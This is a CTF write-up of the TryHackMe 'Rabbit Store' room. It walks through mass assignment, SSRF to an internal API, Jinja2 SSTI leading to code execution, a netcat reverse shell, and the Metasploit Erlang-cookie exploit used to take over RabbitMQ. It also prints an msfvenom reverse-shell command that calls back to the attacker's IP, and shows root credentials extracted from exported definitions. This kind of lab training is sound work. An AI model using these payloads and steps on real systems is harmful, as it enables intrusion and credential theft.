---
title: Rabbit Store
date: 2025-04-30
categories: [TryHackMe, CTF]
tags: [tryhackme, ctf, burp, rabbitmq, mass_assignment, ssti, jinja2, metasploit]     # TAG names should always be lowercase
comments: false
image: /assets/img/tryhackme/ctf/rabbitstore/banner.png
---

> Demonstrate your web application testing skills and the basics of Linux to escalate your privileges.

## What is the user.txt ?

We scan the IP using nmap.

```shell
$ nmap -T4 -A 10.10.103.9
Starting Nmap 7.93 ( https://nmap.org ) at 2025-04-06 17:20 CEST
Nmap scan report for 10.10.103.9 (10.10.103.9)
Host is up (0.065s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3fda550bb3a93b095fb1db535e0befe2 (ECDSA)
|_  256 b7d32ea70891666b30d20cf790cf9af4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://cloudsite.thm/
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=4/6%OT=22%CT=1%CU=30467%PV=Y%DS=2%DC=T%G=Y%TM=67F29BEC
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M509ST11NW7%O2=M509ST11NW7%O3=M509NNT11NW7%O4=M509ST11NW7%O5=M509ST11
OS:NW7%O6=M509ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(
OS:R=Y%DF=Y%T=40%W=F507%O=M509NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 111/tcp)
HOP RTT      ADDRESS
1   62.33 ms 10.14.0.1 (10.14.0.1)
2   62.54 ms 10.10.103.9 (10.10.103.9)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.59 seconds
```

We add the domain to `/etc/hosts` so we can access it on our browser.

```shell
$ echo '10.10.103.9 cloudsite.thm' >> /etc/hosts
```

![1](/assets/img/tryhackme/ctf/rabbitstore/1.png)

If we click the **Login** button, we get redirected to a login page (what a surprise...). If we try to register a test account and connect to it, it tells us that **only internal users can connect to this service**.

From the website, we can scrap a few emails/names we could use.

![2](/assets/img/tryhackme/ctf/rabbitstore/2.png)

However, no matter what we put on the login page, it displays **"Invalid Username or Password"** :

![3](/assets/img/tryhackme/ctf/rabbitstore/3.png)

But didn’t work with using **cewl** and **Burp**.

However, what I noticed while doing that is that the login requests are sent to `/api/login`, it does this if we try with an account that doesn’t exist :

![4](/assets/img/tryhackme/ctf/rabbitstore/4.png)

And if we try with an account that know exist and we created :

![5](/assets/img/tryhackme/ctf/rabbitstore/5.png)

We observe that it creates a **JWT** that specifies that our account is valid but **inactive**.

![6](/assets/img/tryhackme/ctf/rabbitstore/6.png)

Since we know there is an api for login, maybe there are other apis we could possibly interact with ? So we enumerate them using **Gobuster** :

```shell
$ gobuster dir -u http://storage.cloudsite.thm/api/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://storage.cloudsite.thm/api/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/Login                (Status: 405) [Size: 36]
/docs                 (Status: 403) [Size: 27]
/login                (Status: 405) [Size: 36]
/register             (Status: 405) [Size: 36]
/uploads              (Status: 401) [Size: 32]
Progress: 4734 / 4735 (99.98%)
===============================================================
Finished
===============================================================
```

So here, what is interesting is `/docs` (to which we don’t have allowed access) and `/uploads` (that requires a valid token of an active account).

![7](/assets/img/tryhackme/ctf/rabbitstore/7.png)

So what if we provide a token from a valid account, for example the one we got from our inactive account ?

![8](/assets/img/tryhackme/ctf/rabbitstore/8.png)

Well, unfortunately it didn’t work either.

At this point, I was a running out of possibilities. So I had to search the Internet for another possible solution, and by going through some OWASP techniques, I found about [**Mass Assignment**](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html). 

Which means that the object attached to the form used for creating a user is not necessarily the same and may **“hide”** some attributes.

So, as the error page was referring to a **“subscription”**, maybe there is a hidden attribute that I could manipulate to activate the account I register myself with :

![9](/assets/img/tryhackme/ctf/rabbitstore/9.png)

(Along with this, we need to make sure that the JWT is correct).

So now we try to connect to the service with our newly created account, and it works !

![10](/assets/img/tryhackme/ctf/rabbitstore/10.png)

Since we can, I first create a **php reverse shell** using **msfvenom** to upload :

```shell
$ msfvenom -p php/reverse_php LHOST=10.14.83.7 LPORT=1337 -f raw > shell.php
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 2977 bytes
```

It successfully is uploaded and even tells us the file path :

![11](/assets/img/tryhackme/ctf/rabbitstore/11.png)

I try to access it but unfortunately, it doesn’t work but only downloads the file, it doesn’t execute it, so we need to try something else.

We can also upload a file from a **URL** :

![12](/assets/img/tryhackme/ctf/rabbitstore/12.png)

It means that we can start a **python server** and make it recover it from the URL, to test it.

![13](/assets/img/tryhackme/ctf/rabbitstore/13.png)

```shell
# On the attacker machine
$ python3 -m http.server 444       
Serving HTTP on 0.0.0.0 port 444 (http://0.0.0.0:444/) ...
10.10.2.2 - - [08/Apr/2025 20:24:18] "GET /shell.php HTTP/1.1" 200 -
```

So it is indeed working.

Now, we could try to find more information by trying to reach `/api/docs` using this same technique. 

However, when we try to reach the file using this link :

```shell
http://storage.cloudsite.thm/api/docs/

#On the attacker machine
cat 210aaad8-7347-4ef9-8f16-ff5692536b96
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.52 (Ubuntu) Server at cloudsite.thm Port 80</address>
</body></html>
```

This link was not found… So why? Because the **port is not right**. Previously, when we tried creating a new user using **Burp**, we can see on the response that this api is made using **Express**.

![14](/assets/img/tryhackme/ctf/rabbitstore/14.png)

**Express classic port** is `3000`, so this time we try again with this port and…

```shell
cat /root/Downloads/f4be57ff-e540-4b10-8ce1-55565ee92da1
Endpoints Perfectly Completed

POST Requests:
/api/register - For registering user
/api/login - For loggin in the user
/api/upload - For uploading files
/api/store-url - For uploadion files via url
/api/fetch_messeges_from_chatbot - Currently, the chatbot is under development. Once development is complete, it will be used in the future.

GET Requests:
/api/uploads/filename - To view the uploaded files
/dashboard/inactive - Dashboard for inactive user
/dashboard/active - Dashboard for active user

Note: All requests to this endpoint are sent in JSON format.
```

Here, except for the ones that we already know, we see `/api/fetch_messeges_from_chatbot` that triggers our attention.

We try to reach the API by doing a test request, to see what this is about, and it returns an error stating that a `username` parameter is required.

![15](/assets/img/tryhackme/ctf/rabbitstore/15.png)

So, we do it and get a different output.

![16](/assets/img/tryhackme/ctf/rabbitstore/16.png)

Here we can notice that the username is reinjected by the server in the HTML code, which means that this api could be vulnerable to **Server-Side Template Injection**.

We can test it by setting a testing payload as `username` :

![17](/assets/img/tryhackme/ctf/rabbitstore/17.png)

Effectively, we get **49** in the returned HTML code, which means that this is vulnerable !

![18](/assets/img/tryhackme/ctf/rabbitstore/18.png)

By trying another payload, we can notice in the error message that **Jinja2** is the solution used behind.

There is this article that explains how we can [**RCE in Jinja2 SSTI**](https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/).

![19](/assets/img/tryhackme/ctf/rabbitstore/19.png)

So we know that we can execute commands as the `azrael` user. So we can also do the same to get a **reverse shell**!

For that, i can use [revshells.com](http://revshells.com) to generate my payload.

![20](/assets/img/tryhackme/ctf/rabbitstore/20.png)

So I setup my listener using **netcat** and initiate a reverse shell connection as the `azrael` user :

```shell
#On the attacker machine
$ nc -lvnp 5555
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::5555
Ncat: Listening on 0.0.0.0:5555
Ncat: Connection from 10.10.156.167.
Ncat: Connection from 10.10.156.167:47784.
```

I [upgrade my shell](https://0xffsec.com/handbook/shells/full-tty/) and start the flag search.

Obviously, we directly head to azrael’s home folder and find the **first flag**, `user.txt` :

```shell
azrael@forge:~/chatbotServer$ id
uid=1000(azrael) gid=1000(azrael) groups=1000(azrael)
azrael@forge:~/chatbotServer$ cd /home/azrael/
azrael@forge:~$ ls
chatbotServer  snap  user.txt
azrael@forge:~$ cat user.txt
[REDACTED]
```

## What is root.txt ?

Now, we need to find a way to escalate our privileges to root, or at least be able to read `root.txt`.

While I was trying to notice any jobs that were run by root using **pspy**, I noticed that **erlang/rabbitmq** was on the machine.

```shell
2025/04/13 19:10:15 CMD: UID=124   PID=34504  | /bin/sh /usr/lib/erlang/bin/erl -boot no_dot_erlang -sname epmd-starter-779484289 -noinput -s erlang halt
2025/04/13 19:10:15 CMD: UID=124   PID=34505  | /bin/sh /usr/lib/erlang/bin/erl -boot no_dot_erlang -sname epmd-starter-779484289 -noinput -s erlang halt
2025/04/13 19:10:15 CMD: UID=124   PID=34507  | sed s/.*\///
2025/04/13 19:10:15 CMD: UID=124   PID=34508  | sh -c "/usr/lib/erlang/erts-12.2.1/bin/epmd" -daemon
2025/04/13 19:10:15 CMD: UID=124   PID=34509  | /usr/lib/erlang/erts-12.2.1/bin/epmd -daemon
2025/04/13 19:10:15 CMD: UID=124   PID=34511  | /usr/lib/erlang/erts-12.2.1/bin/epmd -daemon
2025/04/13 19:10:15 CMD: UID=???   PID=34510  | ???
2025/04/13 19:10:15 CMD: UID=124   PID=34515  | /usr/lib/erlang/erts-12.2.1/bin/beam.smp -- -root /usr/lib/erlang -progname erl -- -home /var/lib/rabbitmq -- -boot no_dot_erlang -sname epmd-starter-779484289 -noshell -noinput -s erlang halt
2025/04/13 19:10:15 CMD: UID=124   PID=34532  | erl_child_setup 65536
2025/04/13 19:10:15 CMD: UID=124   PID=34533  | inet_gethost 4
2025/04/13 19:10:20 CMD: UID=124   PID=34534  | sh -c exec /bin/sh -s unix:cmd
2025/04/13 19:10:20 CMD: UID=124   PID=34535  |
2025/04/13 19:10:30 CMD: UID=124   PID=34536  | sh -c exec /bin/sh -s unix:cmd
2025/04/13 19:10:30 CMD: UID=124   PID=34537  | /usr/bin/df -kP /var/lib/rabbitmq/mnesia/rabbit@forge
2025/04/13 19:10:40 CMD: UID=124   PID=34538  | sh -c exec /bin/sh -s unix:cmd
2025/04/13 19:10:40 CMD: UID=124   PID=34539  | /bin/sh -s unix:cmd
2025/04/13 19:10:50 CMD: UID=124   PID=34540  | sh -c exec /bin/sh -s unix:cmd
2025/04/13 19:10:50 CMD: UID=124   PID=34541  | /bin/sh -s unix:cmd
2025/04/13 19:11:00 CMD: UID=124   PID=34542  | sh -c exec /bin/sh -s unix:cmd
2025/04/13 19:11:10 CMD: UID=124   PID=34544  | sh -c exec /bin/sh -s unix:cmd
2025/04/13 19:11:10 CMD: UID=124   PID=34545  | /bin/sh -s unix:cmd
2025/04/13 19:11:16 CMD: UID=124   PID=34546  | /bin/sh /usr/lib/erlang/bin/erl -boot no_dot_erlang -sname epmd-starter-484689524 -noinput -s erlang halt
2025/04/13 19:11:16 CMD: UID=124   PID=34547  | /bin/sh /usr/lib/erlang/bin/erl -boot no_dot_erlang -sname epmd-starter-484689524 -noinput -s erlang halt
2025/04/13 19:11:16 CMD: UID=124   PID=34549  | sed s/.*\///
2025/04/13 19:11:16 CMD: UID=124   PID=34548  | /bin/sh /usr/lib/erlang/bin/erl -boot no_dot_erlang -sname epmd-starter-484689524 -noinput -s erlang halt
2025/04/13 19:11:16 CMD: UID=124   PID=34550  | /usr/lib/erlang/erts-12.2.1/bin/erlexec -boot no_dot_erlang -sname epmd-starter-484689524 -noinput -s erlang halt
2025/04/13 19:11:16 CMD: UID=124   PID=34551  | /usr/lib/erlang/erts-12.2.1/bin/epmd -daemon
```

We can see that **UID 124** is the `rabbitmq` user : 

```shell
$ getent passwd 124
rabbitmq:x:124:131:RabbitMQ messaging server,,,:/var/lib/rabbitmq:/usr/sbin/nologin
```

By searching a bit, we can find a way to obtain a shell as the `rabbitmq` user using [**Metasploit**](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/multi/misc/erlang_cookie_rce.md).

We follow these steps and obtain the shell.

```shell
exploit

[*] Started reverse TCP double handler on 10.14.83.7:4444
[*] 10.10.156.167:25672 - Receiving server challenge
[*] 10.10.156.167:25672 - Sending challenge reply
[+] 10.10.156.167:25672 - Authentication successful, sending payload
[*] 10.10.156.167:25672 - Exploiting...
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo ITseJsEb58hak9HB;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket A
[*] A: "sh: 2: Connected: not found\r\nsh: 3: Escape: not found\r\n"
[*] Matching...
[*] B is input...
[*] Command shell session 1 opened (10.14.83.7:4444 -> 10.10.156.167:48062) at 2025-04-13 21:49:00 +0200


Shell Banner:
ITseJsEb58hak9HB
-----

id
uid=124(rabbitmq) gid=131(rabbitmq) groups=131(rabbitmq) 
```

After that, we can use the `rabbitmqctl` command as we want. 

First, we need to set the `.erlang.cookie` permissions as **400**.

And then we can for example enumerate the users :

```shell
rabbitmqctl list_users
Listing users ...
user    tags
The password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password. Please don't attempt to crack SHA-256. []
root    [administrator]
```

Apparently, we need the SHA-256 hashed value of the RabbitMQ root password.

So as said in the [**RabbitMQ documentation**](https://www.rabbitmq.com/docs/definitions), the definitions can contain some interesting informations about the users.

```shell
rabbitmqctl export_definitions /tmp/output.json
Exporting definitions in JSON to a file at "/tmp/output.json" ...

cat /tmp/output.json
{"bindings":[],"exchanges":[],"global_parameters":[{"name":"cluster_name","value":"rabbit@forge"}],"parameters":[],"permissions":[{"configure":".*","read":".*","user":"root","vhost":"/","write":".*"}],"policies":[],"queues":[{"arguments":{},"auto_delete":false,"durable":true,"name":"tasks","type":"classic","vhost":"/"}],"rabbit_version":"3.9.13","rabbitmq_version":"3.9.13","topic_permissions":[{"exchange":"","read":".*","user":"root","vhost":"/","write":".*"}],"users":[{"hashing_algorithm":"rabbit_password_hashing_sha256","limits":{},"name":"The password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password. Please don't attempt to crack SHA-256.","password_hash":"vyf4qvKLpShONYgEiNc6xT/5rLq+23A2RuuhEZ8N10kyN34K","tags":[]},{"hashing_algorithm":"rabbit_password_hashing_sha256","limits":{},"name":"root","password_hash":"49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF","tags":["administrator"]}],"vhosts":[{"limits":[],"metadata":{"description":"Default virtual host","tags":[]},"name":"/"}]}
```

Thanks to that we found the **“password”**, which is `49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF`.

However, we see on the [RabbitMQ documentation](https://www.rabbitmq.com/docs/passwords) that to produce such a string, it goes through a **special algorithm**.

Which is the following (rewriting what was written on the documentation):

- Generate a random 32 bit salt. In this example, we will use `908D C60A`. When RabbitMQ creates or updates a user, a random salt is generated.
- Prepend the generated salt with the UTF-8 representation of the desired password. If the password is `test12`, at this step, the intermediate result would be `908D C60A 7465 7374 3132`
- Take the hash (this example assumes the default [hashing function](https://www.rabbitmq.com/docs/passwords#changing-algorithm), SHA-256): `A5B9 24B3 096B 8897 D65A 3B5F 80FA 5DB62 A94 B831 22CD F4F8 FEAD 10D5 15D8 F391`
- Prepend the salt again: `908D C60A A5B9 24B3 096B 8897 D65A 3B5F 80FA 5DB62 A94 B831 22CD F4F8 FEAD 10D5 15D8 F391`
- Convert the value to base64 encoding: `kI3GCqW5JLMJa4iX1lo7X4D6XbYqlLgxIs30+P6tENUV2POR`
- Use the finaly base64-encoded value as the `password_hash` value in HTTP API requests and generated definition files

So because we need the **sha256 hash**, we first decode the **base64** string :

```shell
$ echo '49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF' | base64 -d | xxd
00000000: e3d7 ba85 295d 1d16 a261 7df6 f7e6 6305  ....)]...a}...c.
00000010: 27ff 2f1e bb5c 43b3 f6ec 6148 11ed 194f  './..\C...aH...O
00000020: 9807 3585                                ..5.
```

And we erase the **32bits salt** at the beginning to obtain our **root password**, change user and retrieve the **last flag** :

```shell
$ cat sha256
295d1d16a2617df6f7e6630527ff2f1ebb5c43b3f6ec614811ed194f98073585
```

```shell
azrael@forge:/var/lib/rabbitmq$ su root
Password:
root@forge:/var/lib/rabbitmq# ls /root/
forge_web_service  root.txt  snap
root@forge:/var/lib/rabbitmq# cat /root/root.txt
[REDACTED]
```

